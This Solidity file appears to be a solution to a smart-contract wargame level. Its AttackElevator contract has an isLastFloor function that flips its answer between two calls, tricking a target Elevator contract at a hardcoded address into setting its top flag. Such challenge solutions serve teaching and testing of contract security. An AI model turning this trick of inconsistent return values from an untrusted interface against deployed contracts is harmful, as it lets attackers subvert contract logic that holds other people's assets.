// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IBuilding {
    function goTo(uint _floor) external;
}

contract AttackElevator {
    address elevatorContractAddress = 0x377c824010E6Fb876a258f56b2a3a8833fD2A060;
    IBuilding elevatorInstance = IBuilding(elevatorContractAddress);

    bool isRealTop = false;

// Malicious implementation - forced to first return false, then true in order to change top boolean to true
// This works because isLastFloor is called twice in the original Elevator contract.
// The first call checks if the original last floor has been met (needs to return false)
// The second call updates the last floor's value (needs to return true)
    function isLastFloor(uint) public returns (bool) {
        if (!isRealTop) {
            isRealTop = true;
            return false;
        }
        isRealTop = false;
        return true;
    }

    function callGoTo(uint _floor) public {
        elevatorInstance.goTo(_floor);
    }
}
